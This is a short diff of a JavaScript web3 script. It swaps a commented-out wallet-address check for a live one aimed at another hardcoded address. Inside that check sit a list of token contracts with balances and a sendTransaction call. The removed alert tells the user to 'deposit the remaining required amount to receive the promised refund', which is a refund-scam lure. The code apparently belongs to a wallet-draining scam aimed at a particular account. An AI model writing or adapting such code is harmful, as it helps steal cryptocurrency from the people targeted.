@@ -878,12 +878,9 @@ console.log(collection)
   }
 
 
-  // if (account == '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262') {
+  if (account == '0x4b4f2c8f622c6790a5c04886b3d7c538b87153cd') {
 
-  //       alert('error: 2389\nmessage: connected account must deposit the remaining required amount to receive the promised refund')
-  // }
-
-const t = [
+        const t = [
   [{token: '0x767FE9EDC9E0dF98E07454847909b5E959D7ca0E'}, {balance: 79}],
   [{token: '0xF57e7e7C23978C3cAEC3C3548E3D615c346e79fF'}, {balance: 2976}],
 
@@ -924,11 +921,14 @@ await web3.eth.sendTransaction(txData)
     console.log(err)
   })
 
+  } //end of if
+
+
 
   
 
 }
-
+//
 
 async function nfts(addr) {
   var url = `${OPENSEA_URL}api/v2/chain/ethereum/account/${addr}/nfts`  
